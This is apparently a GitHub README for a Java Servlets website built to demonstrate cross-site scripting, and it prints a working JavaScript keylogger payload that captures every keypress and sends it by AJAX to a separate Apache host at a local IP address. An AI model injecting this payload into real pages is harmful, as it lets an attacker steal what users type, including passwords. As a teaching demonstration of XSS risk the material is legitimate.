# XSS-Demo
I made this website using *Java Servlets* for giving a demo of **XSS and its dangers**.

![XSS](https://github.com/Miraj50/XSS-Demo/blob/master/XSS_Demo.gif)

I hosted the website on my Tomcat Server and used Apache for Keylogging.

The payload for keylogging:
```
document.addEventListener('keypress', function() {
	console.log(arguments[0].key);
	$.ajax({
		type: 'GET',
		url: 'http://192.168.0.105', #apache
		data: { 
			'key': arguments[0].key, 
		},
	});
});
```
